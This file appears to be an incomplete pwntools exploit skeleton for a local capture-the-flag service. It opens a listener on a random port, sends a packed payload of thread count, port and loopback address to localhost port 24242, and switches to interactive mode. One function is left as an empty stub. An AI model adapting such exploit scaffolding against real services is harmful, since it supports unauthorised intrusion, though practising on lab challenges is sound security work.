from pwn import *
import socket
import threading
import random

p = random.randint(20000, 50000)
num_threads = 90

def thread_listen(port=9999):
    l = socket.socket()
    l.bind(('0.0.0.0', port))
    l.listen(5)

    for i in xrange(num_threads):
        c, _ = l.accept()
        print(c, _)

def thread_send(c, size1, size2, index=0xffff):
    pass

def start_threads():
    t = threading.Thread(target=thread_listen, args=(p, ))
    t.daemon = True
    t.start()
    return t

curr_t = start_threads()

r = remote('127.0.0.1', 24242)

n_threads = p16(num_threads)
connect_host = socket.inet_aton('127.0.0.1')

payload = n_threads
payload += p16(p) # port
payload += connect_host

r.sendline(payload)

r.interactive()
